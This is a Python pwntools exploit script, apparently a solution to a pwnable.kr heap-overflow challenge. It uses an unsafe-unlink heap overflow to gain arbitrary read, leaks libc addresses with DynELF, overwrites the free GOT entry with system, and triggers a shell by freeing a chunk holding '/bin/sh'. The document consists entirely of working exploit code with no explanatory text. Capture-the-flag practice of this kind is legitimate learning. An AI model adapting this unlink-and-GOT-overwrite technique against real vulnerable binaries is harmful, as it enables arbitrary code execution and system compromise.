from pwn import *

chunk_addr = 0x8049d60
free_got = 0x8049ce8

def launch_gdb():
    context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
    gdb.attach(proc.pidof(p)[0])


def leak(addr):
    setchunk('0', 'A'*0xc+p32(chunk_addr-0xc)+p32(addr))
    recv_addr = printchunk('1')
    print ("leaking "+hex(addr)+" --> " + recv_addr.encode('hex'))
    #if addr!=0x8048000:
    #    launch_gdb()
    return recv_addr

def addchunk(size):
    p.sendline('1')
    p.recvuntil('you want to add:')
    p.sendline(size)
    p.recvuntil('5.Exit\n')

def setchunk(v, data):
    p.sendline('2')
    p.recvuntil('Set chunk index:')
    p.sendline(v)
    p.recvuntil('Set chunk data:')
    p.sendline(data)
    p.recvuntil('5.Exit\n')

def deletechunk(v):
    p.sendline('3')
    p.recvuntil('Delete chunk index:')
    p.sendline(v)
    p.recvuntil('5.Exit\n')

def printchunk(v):
    p.sendline('4')
    p.recvuntil('Print chunk index:')
    p.sendline(v)
    return p.recv(4)

p = process(['/home/etenal/pwnable.kr/heap_overflow/heap'])
for i in range(0,3):
    addchunk('64')

#print (p.recvuntil('index:'))
payload = p32(0)+p32(65)+p32(chunk_addr-0xc)+p32(chunk_addr-0x8)+'A'*(64-4*4)+p32(64)+p32(72)
#payload = 'AAA'
setchunk('0', payload)

deletechunk('1')



pwn_elf = ELF('/home/etenal/pwnable.kr/heap_overflow/heap')
d = DynELF(leak, elf=pwn_elf)
sys_addr = d.lookup('system', 'libc')
print("system addr: %#x" % sys_addr)

setchunk('0', 'A'*12 + p32(free_got))
setchunk('0', p32(sys_addr))
#launch_gdb()
setchunk('2', '/bin/sh')
p.sendline('3')
print p.recv(4096)
p.sendline('2')
p.interactive()
